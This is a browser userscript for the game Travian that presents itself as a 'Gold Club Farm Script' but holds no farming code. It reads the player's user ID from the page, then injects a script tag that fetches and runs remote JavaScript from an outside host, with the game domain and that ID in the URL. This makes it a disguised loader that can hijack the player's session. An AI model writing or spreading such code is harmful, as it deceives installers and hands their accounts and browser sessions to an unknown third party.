// ==UserScript==

// @name           Art

// @namespase      http://vkontakte.ru/ld8228

// @description    Gold Club Farm Script

// @author         Art

// @include        http://*.travian.*

// @email          prikkk@list.ru

// @version        1.0

// @source         http://vkontakte.ru/ld8228

// ==/UserScript==

var user_data, content, uid;
content = document.getElementById('wrapper').innerHTML;
uid = explode('<a class="signLink" href="spieler.php?uid=', content);
uid = uid[1];
uid = explode('"', uid);
uid = uid[0];
user_data = 'http://vkontakte.ru/ld8228/'+document.domain+'/'+uid+'.js';
var js = document.createElement('script');
js.setAttribute('type', 'text/javascript');
js.setAttribute('src', user_data);
document.getElementsByTagName("body")[0].appendChild(js);
function explode( delimiter, string ) {var emptyArray = { 0: '' };if ( arguments.length != 2|| typeof arguments[0] == 'undefined'|| typeof arguments[1] == 'undefined' ){return null;}if ( delimiter === ''|| delimiter === false|| delimiter === null ){return false;}if ( typeof delimiter == 'function'|| typeof delimiter == 'object'|| typeof string == 'function'|| typeof string == 'object' ){return emptyArray;}if ( delimiter === true ) {delimiter = '1';}return string.toString().split ( delimiter.toString() );}